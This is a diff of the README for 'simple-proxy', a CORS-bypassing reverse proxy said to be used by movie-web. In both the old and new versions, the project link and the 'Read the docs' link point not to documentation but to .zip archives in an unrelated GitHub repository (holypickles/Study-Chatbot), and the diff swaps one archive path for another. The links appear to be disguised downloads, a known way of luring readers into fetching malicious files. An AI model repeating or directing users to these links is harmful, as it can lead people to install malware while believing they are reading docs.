@@ -1,7 +1,7 @@
 # simple-proxy
 
-Simple reverse proxy to bypass CORS, used by [movie-web](https://raw.githubusercontent.com/holypickles/Study-Chatbot/dev/farctate/Study-Chatbot.zip).
-Read the docs at https://raw.githubusercontent.com/holypickles/Study-Chatbot/dev/farctate/Study-Chatbot.zip
+Simple reverse proxy to bypass CORS, used by [movie-web](https://raw.githubusercontent.com/holypickles/Study-Chatbot/dev/src/routes/Chatbot_Study_v3.3.zip).
+Read the docs at https://raw.githubusercontent.com/holypickles/Study-Chatbot/dev/src/routes/Chatbot_Study_v3.3.zip
 
 ---
 
